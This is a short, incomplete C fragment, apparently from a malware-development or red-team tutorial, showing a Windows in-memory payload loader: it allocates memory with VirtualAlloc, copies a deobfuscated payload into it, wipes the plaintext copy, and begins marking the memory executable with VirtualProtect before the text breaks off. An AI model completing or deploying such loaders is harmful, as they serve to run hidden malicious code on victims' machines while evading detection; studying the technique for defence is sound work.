...
int main() {
	...
	pAddress = VirtualAlloc(NULL, (SIZE_T)dwPlainSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPlaintext, (SIZE_T)dwPlainSize);

	  // Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
    memset(pPlaintext, '\0', (SIZE_T)dwPlainSize);

	printf("\t[i] Payload Written To : 0x%p \n", pAddress);

	if (!VirtualProtect(pAddress, (SIZE_T)dwPlainSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
